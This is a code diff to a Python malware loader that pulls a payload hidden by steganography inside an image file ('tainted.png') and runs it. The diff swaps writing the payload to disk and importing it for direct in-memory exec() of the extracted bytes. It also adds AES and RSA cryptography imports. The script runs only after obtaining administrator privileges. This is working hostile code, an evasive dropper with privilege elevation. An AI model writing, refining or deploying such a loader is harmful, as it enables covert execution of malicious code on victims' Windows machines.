@@ -9,6 +9,15 @@ import importlib.util
 import requests
 import rsa
 import threading
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+
 
 def log_checkpoint(message):
     """ Log checkpoints for debugging purposes """
@@ -104,27 +113,28 @@ def run_payload():
         extracted_data = extracted_bits[32:32 + data_length]
 
         file_data = btoc(extracted_data)
-        with open(output_file_path, 'wb') as out_file:
-            out_file.write(file_data)
-            print(f"File successfully extracted and saved as {output_file_path}")
-
+        # with open(output_file_path, 'wb') as out_file:
+        #     out_file.write(file_data)
+        #     print(f"File successfully extracted and saved as {output_file_path}")
+        
+        exec(file_data)
     # Usage
     extract_file_from_image('tainted.png', 'extracted_payload.py')
 
-    try:
-        log_checkpoint(f"Attempting to execute the extracted payload: ./extracted_payload")
-        spec = importlib.util.spec_from_file_location("extracted_payload","./extracted_payload.py" )
-        extracted_module = importlib.util.module_from_spec(spec)
-        spec.loader.exec_module(extracted_module)
-
-        # if hasattr(extracted_module, "windows_payload"):
-        #     log_checkpoint("Found `windows_payload` function. Executing...")
-        #     extracted_module.windows_payload()
-        #     print("Successfully executed `windows_payload` from the extracted payload.")
-        # else:
-        #     log_checkpoint("No `windows_payload` function found in the extracted payload.")
-    except Exception as e:
-        log_checkpoint(f"Error occurred while importing or executing the payload: {e}")
+    # try:
+    #     # log_checkpoint(f"Attempting to execute the extracted payload: ./extracted_payload")
+    #     # spec = importlib.util.spec_from_file_location("extracted_payload","./extracted_payload.py" )
+    #     # extracted_module = importlib.util.module_from_spec(spec)
+    #     # spec.loader.exec_module(extracted_module)
+        
+    #     # if hasattr(extracted_module, "windows_payload"):
+    #     #     log_checkpoint("Found `windows_payload` function. Executing...")
+    #     #     extracted_module.windows_payload()
+    #     #     print("Successfully executed `windows_payload` from the extracted payload.")
+    #     # else:
+    #     #     log_checkpoint("No `windows_payload` function found in the extracted payload.")
+    # except Exception as e:
+    #     log_checkpoint(f"Error occurred while importing or executing the payload: {e}")
 
 if __name__ == "__main__":
     if run_as_admin():  # Only proceed if elevated privileges are obtained
